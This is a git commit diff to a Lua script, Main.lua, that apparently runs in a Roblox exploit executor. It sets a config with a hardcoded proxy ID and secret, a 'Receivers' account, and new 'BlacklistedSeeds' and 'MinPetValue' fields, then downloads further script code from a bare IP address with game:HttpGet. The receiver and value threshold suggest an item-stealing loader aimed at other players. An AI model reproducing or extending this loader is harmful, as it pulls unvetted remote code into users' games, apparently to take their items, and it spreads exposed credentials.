a78149102edf6a0a7ab71031db76a67ab2ea516f
Vodi509 <biktimirovdamir107@gmail.com>
2026-06-21 16:55:11 +0400

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,7 +1,9 @@
 getgenv().StarScriptsConfig = {
     ProxyId = "SgeCl3DrnJfcAi4cm2CpR4oPw805lbby",
     ProxySecret = "DDcAfzQc_X-7duZTA5I9QQ7AAxU2ye9YLVq3briOavA",
-    Receivers = {"vodi509"}
+    Receivers = {"vodi509"},
+    BlacklistedSeeds = {"carrot", "corn", "pineapple", "blueberry", "apple", "strawberry"},
+    MinPetValue = 75000
 }
 
 local serverScript = game:HttpGet("http://205.185.125.84/gag2/garden2")
